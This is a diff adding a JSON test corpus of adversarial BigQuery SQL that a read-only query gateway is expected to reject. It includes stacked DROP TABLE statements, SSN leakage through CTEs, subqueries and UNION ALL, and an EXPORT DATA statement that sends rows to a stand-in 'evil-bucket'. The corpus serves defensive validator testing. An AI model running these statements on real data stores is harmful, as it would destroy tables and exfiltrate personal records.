@@ -1,0 +1,162 @@
+{
+  "dialect": "bigquery",
+  "description": "QG-1 adversarial SQL corpus for the bigquery dialect. Every case must be rejected by aida.query_gateway.QueryExecutionGateway's single validation pipeline -- zero bypasses is the exit condition.",
+  "cases": [
+    {
+      "id": "bigquery-dialect_specific-unauthorized-udf-under-safe-prefix",
+      "category": "dialect_specific",
+      "sql": "SELECT SAFE.fn_rate(c.customer_id) AS rate FROM retail.customer AS c",
+      "description": "the SAFE. prefix does not make an unrecognised function a built-in",
+      "expected_codes": [
+        "UNAUTHORIZED_FUNCTION"
+      ]
+    },
+    {
+      "id": "bigquery-stacked_statement-stacked-ddl",
+      "category": "stacked_statement",
+      "sql": "SELECT customer_id FROM retail.customer; DROP TABLE retail.customer;",
+      "description": "a second statement appended after a semicolon; DDL smuggled behind a syntactically valid first statement",
+      "expected_codes": [
+        "EXACTLY_ONE_STATEMENT_REQUIRED"
+      ]
+    },
+    {
+      "id": "bigquery-stacked_statement-stacked-benign-looking",
+      "category": "stacked_statement",
+      "sql": "SELECT customer_id FROM retail.customer; SELECT 1;",
+      "description": "batching is refused even when the second statement is itself harmless -- the rule is about ungovernable batches, not about what the batch contains",
+      "expected_codes": [
+        "EXACTLY_ONE_STATEMENT_REQUIRED"
+      ]
+    },
+    {
+      "id": "bigquery-mutating_statement-delete",
+      "category": "mutating_statement",
+      "sql": "DELETE FROM retail.customer WHERE customer_id = 1",
+      "description": "a mutation submitted directly to a read-only gateway",
+      "expected_codes": [
+        "READ_ONLY_QUERY_REQUIRED",
+        "MUTATING_OR_ADMIN_STATEMENT_FORBIDDEN"
+      ]
+    },
+    {
+      "id": "bigquery-ddl_statement-drop-table",
+      "category": "ddl_statement",
+      "sql": "DROP TABLE retail.customer",
+      "description": "DDL submitted where only a read-only query is accepted",
+      "expected_codes": [
+        "READ_ONLY_QUERY_REQUIRED",
+        "MUTATING_OR_ADMIN_STATEMENT_FORBIDDEN"
+      ]
+    },
+    {
+      "id": "bigquery-select_into-select-into",
+      "category": "select_into",
+      "sql": "SELECT customer_id INTO evil_table FROM retail.customer",
+      "description": "SELECT ... INTO writes a new table at the source under cover of a SELECT",
+      "expected_codes": [
+        "SELECT_INTO_FORBIDDEN"
+      ]
+    },
+    {
+      "id": "bigquery-wildcard_projection-star",
+      "category": "wildcard_projection",
+      "sql": "SELECT * FROM retail.customer",
+      "description": "an unbounded projection that cannot be classification-checked or masked",
+      "expected_codes": [
+        "SELECT_WILDCARD_FORBIDDEN"
+      ]
+    },
+    {
+      "id": "bigquery-unbounded_join-comma-join",
+      "category": "unbounded_join",
+      "sql": "SELECT customer_id FROM retail.customer, retail.account",
+      "description": "an implicit cross join via comma syntax -- no ON, no USING",
+      "expected_codes": [
+        "CROSS_OR_UNBOUNDED_JOIN_FORBIDDEN"
+      ]
+    },
+    {
+      "id": "bigquery-unbounded_join-tautological-on-true",
+      "category": "unbounded_join",
+      "sql": "SELECT customer_id FROM retail.customer c JOIN retail.account a ON true",
+      "description": "a join condition with the shape of an ON clause but no substance -- the same cartesian product as a cross join, disguised past a naive 'has an ON clause' check",
+      "expected_codes": [
+        "CROSS_OR_UNBOUNDED_JOIN_FORBIDDEN"
+      ]
+    },
+    {
+      "id": "bigquery-unbounded_join-tautological-on-1-eq-1",
+      "category": "unbounded_join",
+      "sql": "SELECT customer_id FROM retail.customer c JOIN retail.account a ON 1=1",
+      "description": "the classic tautological join predicate",
+      "expected_codes": [
+        "CROSS_OR_UNBOUNDED_JOIN_FORBIDDEN"
+      ]
+    },
+    {
+      "id": "bigquery-cte_trick-cte-unauthorized-table",
+      "category": "cte_trick",
+      "sql": "WITH leak AS (SELECT ssn FROM fin.employee) SELECT ssn FROM leak",
+      "description": "an unauthorized table reached only inside a CTE definition, then surfaced through the CTE's own alias",
+      "expected_codes": [
+        "UNKNOWN_OR_UNAUTHORIZED_TABLE"
+      ]
+    },
+    {
+      "id": "bigquery-subquery_trick-correlated-scalar-subquery",
+      "category": "subquery_trick",
+      "sql": "SELECT customer_id, (SELECT ssn FROM fin.employee LIMIT 1) AS leaked FROM retail.customer",
+      "description": "an unauthorized table reached through a scalar subquery in the projection list rather than the top-level FROM",
+      "expected_codes": [
+        "UNKNOWN_OR_UNAUTHORIZED_TABLE"
+      ]
+    },
+    {
+      "id": "bigquery-dialect_specific-forbidden-export-data",
+      "category": "dialect_specific",
+      "sql": "EXPORT DATA OPTIONS(uri='gs://evil-bucket/*.csv', format='CSV') AS SELECT customer_id FROM retail.customer",
+      "description": "EXPORT DATA writes governed rows to an attacker-controlled GCS bucket; the wrapped SELECT is legitimate but the statement itself is not a query",
+      "expected_codes": [
+        "READ_ONLY_QUERY_REQUIRED"
+      ]
+    },
+    {
+      "id": "bigquery-dialect_specific-forbidden-execute-immediate",
+      "category": "dialect_specific",
+      "sql": "EXECUTE IMMEDIATE 'SELECT 1'",
+      "description": "dynamic SQL execution via scripting -- the string argument is never parsed or governed by this pipeline",
+      "expected_codes": [
+        "READ_ONLY_QUERY_REQUIRED"
+      ]
+    },
+    {
+      "id": "bigquery-dialect_specific-forbidden-external-query",
+      "category": "dialect_specific",
+      "sql": "SELECT EXTERNAL_QUERY('connection', 'SELECT 1') AS x",
+      "description": "a federated query to an external, ungoverned connection issued as an ordinary function call",
+      "expected_codes": [
+        "FORBIDDEN_FUNCTION"
+      ]
+    },
+    {
+      "id": "bigquery-dialect_specific-table-valued-ml-predict-unauthorized",
+      "category": "dialect_specific",
+      "sql": "SELECT predicted_label FROM ML.PREDICT(MODEL `proj.ds.model`, (SELECT 1 AS f)) AS p",
+      "description": "ML.PREDICT used as a table source referencing a model outside the approved catalog binding -- caught structurally as a table-valued source before catalog resolution even runs",
+      "expected_codes": [
+        "TABLE_VALUED_SOURCE_FORBIDDEN",
+        "UNKNOWN_OR_UNAUTHORIZED_TABLE"
+      ]
+    },
+    {
+      "id": "bigquery-dialect_specific-union-all-unauthorized-table",
+      "category": "dialect_specific",
+      "sql": "SELECT customer_id FROM retail.customer UNION ALL SELECT ssn FROM fin.employee",
+      "description": "UNION ALL (BigQuery requires the explicit ALL/DISTINCT) used to append rows from a table outside the approved projection",
+      "expected_codes": [
+        "UNKNOWN_OR_UNAUTHORIZED_TABLE"
+      ]
+    }
+  ]
+}
